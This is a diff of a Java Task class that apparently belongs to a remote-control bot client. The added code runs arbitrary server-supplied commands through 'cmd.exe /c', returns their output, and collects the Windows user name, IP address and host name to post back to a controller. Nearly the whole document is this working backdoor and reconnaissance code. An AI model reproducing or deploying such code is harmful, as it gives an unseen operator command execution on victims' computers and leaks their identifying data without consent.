@@ -4,8 +4,10 @@ import org.json.JSONObject;
 import com.google.gson.Gson;
 
 import java.io.*;
+import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.util.UUID;
 import java.util.Base64;
@@ -17,7 +19,7 @@ public class Task {
     String cmd; //command
     String response;
     boolean proceeded;
-    enum TaskType{VIEW_SITE, GET_IP, SEND_FILES};
+    enum TaskType{HELLO, VIEW_SITE, CMD_RUN};
 
     public Task(String jsonString){
         JSONObject json = new JSONObject(jsonString);
@@ -37,27 +39,70 @@ public class Task {
     public void sendToDo(){
         APIcaller.post(this.toJson());
     }
+
     public boolean proceed(){
-        try {
+
             if (type == TaskType.VIEW_SITE) {
-                File webPageFile = getWebPage(cmd);
-            } else {
+                getWebPage(cmd);
+            }
+            else if(type == TaskType.HELLO){
+                if(cmd =="How are you?"){
+                    response = sayHello();
+                }
+
+            }
+            else if(type==TaskType.CMD_RUN){
+                response = runCmd();
+            }
+            else {
                 response = "nothing done";
             }
             proceeded = true;
             sendResponse();
             return true;
-        }catch (Exception e){
-            e.printStackTrace();
         }
-        return false;
+
+    private String runCmd() {
+        try {
+            StringBuilder stringBuilder = new StringBuilder();
+            ProcessBuilder builder = new ProcessBuilder(
+                    "cmd.exe", "/c", cmd);
+            builder.redirectErrorStream(true);
+            Process p = builder.start();
+            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            while (true) {
+                line = r.readLine();
+                if (line == null) { break; }
+                stringBuilder.append(line);
+            }
+            return stringBuilder.toString();
+        } catch (IOException ioException) {
+            ioException.printStackTrace();
+        }
+        return null;
     }
+
+
+    private String sayHello()  {
+        try {
+            InetAddress inetAddress = InetAddress.getLocalHost();
+            String userName = new com.sun.security.auth.module.NTSystem().getName();
+            String IP = inetAddress.getHostAddress();
+            String host = inetAddress.getHostName();
+            return String.format("I am fine! %s send kisses from IP %s and device %s", userName, IP, host);
+        }catch (UnknownHostException uhe){
+            System.out.println("I am not feeling well! I don't know where am I...");
+        }
+        return "Nothing to say to You!";
+        }
+
     void sendResponse(){
         APIcaller.post(this.toJson());
     }
-    File getWebPage(String websiteAdress){
+    File getWebPage(String websiteAddress){
         try {
-            URL url = new URL(websiteAdress);
+            URL url = new URL(websiteAddress);
             BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
             File file = FilesOperator.saveFile(reader, "website.html");
 
